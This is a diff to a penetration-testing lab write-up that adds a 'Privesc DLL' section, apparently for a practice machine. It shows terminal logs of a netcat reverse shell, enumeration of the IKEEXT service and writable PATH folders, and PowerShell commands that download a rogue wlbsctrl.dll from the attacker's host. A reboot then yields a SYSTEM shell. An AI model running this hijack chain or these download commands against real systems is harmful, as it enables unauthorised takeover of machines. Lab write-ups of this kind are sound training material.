@@ -1965,7 +1965,7 @@ C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud>
 ```
 
 
-```
+```powershell
 ┌──(kali㉿kali)-[~]
 └─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
 listening on [any] 80 ...
@@ -2011,6 +2011,205 @@ C:\Users\fluffy\Desktop>
 ```
 
 ![](Pasted%20image%2020220206010020.png)
+
+# Privesc DLL
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
+listening on [any] 80 ...
+connect to [192.168.49.111] from (UNKNOWN) [192.168.111.44] 49354
+Microsoft Windows [Version 6.0.6002]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+C:\UnrealTournament\System>whoami
+whoami
+fluffy-pc\daisy
+
+C:\UnrealTournament\System>sc query IKEEXT
+sc query IKEEXT
+
+SERVICE_NAME: IKEEXT 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\UnrealTournament\System>dir wlbsctrl.dll /s
+dir wlbsctrl.dll /s
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+File Not Found
+
+C:\UnrealTournament\System>PATH
+PATH
+PATH=C:\Python\Scripts\;C:\Python\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+
+C:\UnrealTournament\System>icacls C:\Python\Scripts\
+icacls C:\Python\Scripts\
+C:\Python\Scripts\ BUILTIN\Administrators:(I)(F)
+                   BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                   NT AUTHORITY\SYSTEM:(I)(F)
+                   NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                   BUILTIN\Users:(I)(OI)(CI)(RX)
+                   NT AUTHORITY\Authenticated Users:(I)(M)
+                   NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\UnrealTournament\System>icacls C:\Python\
+icacls C:\Python\
+C:\Python\ BUILTIN\Administrators:(I)(F)
+           BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+           NT AUTHORITY\SYSTEM:(I)(F)
+           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+           BUILTIN\Users:(I)(OI)(CI)(RX)
+           NT AUTHORITY\Authenticated Users:(I)(M)
+           NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\UnrealTournament\System>powershell -c "wget 192.168.49.111/wlbsctrl.dll -o C:\Python\wlbsctrl.dll"
+powershell -c "wget 192.168.49.111/wlbsctrl.dll -o C:\Python\wlbsctrl.dll"
+
+
+^C
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
+retrying local 0.0.0.0:80 : Address already in use
+^C
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
+listening on [any] 80 ...
+connect to [192.168.49.111] from (UNKNOWN) [192.168.111.44] 49555
+Microsoft Windows [Version 6.0.6002]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+C:\UnrealTournament\System>powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.111/wlbsctrl.dll','C:\Python\wlbsctrl.dll')"
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.111/wlbsctrl.dll','C:\Python\wlbsctrl.dll')"
+
+
+C:\UnrealTournament\System>dir /B C:\Python\wlbsctrl.dll
+dir /B C:\Python\wlbsctrl.dll
+wlbsctrl.dll
+
+C:\UnrealTournament\System>shutdown -r -t 10 && exit
+shutdown -r -t 10 && exit
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ 
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nlvp 4445  
+[sudo] password for kali: 
+listening on [any] 4445 ...
+connect to [192.168.49.111] from (UNKNOWN) [192.168.111.44] 49158
+Microsoft Windows [Version 6.0.6002]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd \Users\Administrator
+cd \Users\Administrator
+The system cannot find the path specified.
+
+C:\Windows\system32>cd \Users
+cd \Users
+
+C:\Users>dir
+dir
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+
+ Directory of C:\Users
+
+09/30/2015  11:19 PM    <DIR>          .
+09/30/2015  11:19 PM    <DIR>          ..
+03/20/2022  06:22 PM    <DIR>          daisy
+11/12/2015  05:39 AM    <DIR>          fluffy
+10/07/2015  04:05 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  13,073,342,464 bytes free
+
+C:\Users>cd daisy\Desktop
+cd daisy\Desktop
+
+C:\Users\daisy\Desktop>dir
+dir
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+
+ Directory of C:\Users\daisy\Desktop
+
+12/22/2020  05:14 AM    <DIR>          .
+12/22/2020  05:14 AM    <DIR>          ..
+10/03/2015  02:17 AM               762 HexChat (x64).lnk
+10/03/2015  02:24 AM               846 inspircd.lnk
+10/03/2015  03:03 AM               108 irc.txt
+03/20/2022  05:59 PM                34 local.txt
+09/30/2015  11:01 PM               838 Mumble.lnk
+10/06/2015  10:16 AM             2,347 Murmur.lnk
+10/06/2015  10:14 AM             1,622 Start UT Server (Looped).lnk
+09/30/2015  10:59 PM               586 XAMPP Control Panel.lnk
+10/07/2015  04:44 AM            55,004 xampp.pdf
+               9 File(s)         62,147 bytes
+               2 Dir(s)  13,073,342,464 bytes free
+
+C:\Users\daisy\Desktop>cd ..\..\fluffy\Desktop
+cd ..\..\fluffy\Desktop
+
+C:\Users\fluffy\Desktop>dir
+dir
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+
+ Directory of C:\Users\fluffy\Desktop
+
+12/22/2020  05:17 AM    <DIR>          .
+12/22/2020  05:17 AM    <DIR>          ..
+10/03/2015  02:17 AM               762 HexChat (x64).lnk
+10/03/2015  02:34 AM               774 inspircd.lnk
+09/30/2015  11:01 PM               838 Mumble.lnk
+09/30/2015  11:01 PM             1,860 Murmur.lnk
+03/20/2022  06:00 PM                34 proof.txt
+10/06/2015  10:14 AM             1,622 Start UT Server (Looped).lnk
+09/30/2015  10:59 PM               586 XAMPP Control Panel.lnk
+09/30/2015  10:59 PM               507 XAMPP htdocs folder.lnk
+               8 File(s)          6,983 bytes
+               2 Dir(s)  13,073,387,520 bytes free
+
+C:\Users\fluffy\Desktop>type proof.txt
+type proof.txt
+4b447d01fb4c62f79135f45f5bdc3261
+
+C:\Users\fluffy\Desktop>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.111.44
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.111.254
+
+Tunnel adapter Local Area Connection* 6:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+C:\Users\fluffy\Desktop>
+```
 
 # Others
 https://www.google.com/search?q=foxit+reader+exploit+privilege+escalation&rlz=1C1ONGR_enSG945SG945&sxsrf=APq-WBt0u0jnIKONLEj14xpofIu1a08vrQ%3A1644079386884&ei=Gqn-YYO3NZmo4t4PiPiW6AI&ved=0ahUKEwiDrNn-gOn1AhUZlNgFHQi8BS0Q4dUDCA8&uact=5&oq=foxit+reader+exploit+privilege+escalation&gs_lcp=Cgdnd3Mtd2l6EAM6BwgjELADECc6BwgAEEcQsAM6BQgAEIAEOgYIABAWEB46CAghEBYQHRAeOgQIIRAKSgQIQRgASgQIRhgAUKgEWLYaYPobaAFwAngAgAF9iAGxCpIBBDIwLjGYAQCgAQHIAQnAAQE&sclient=gws-wiz
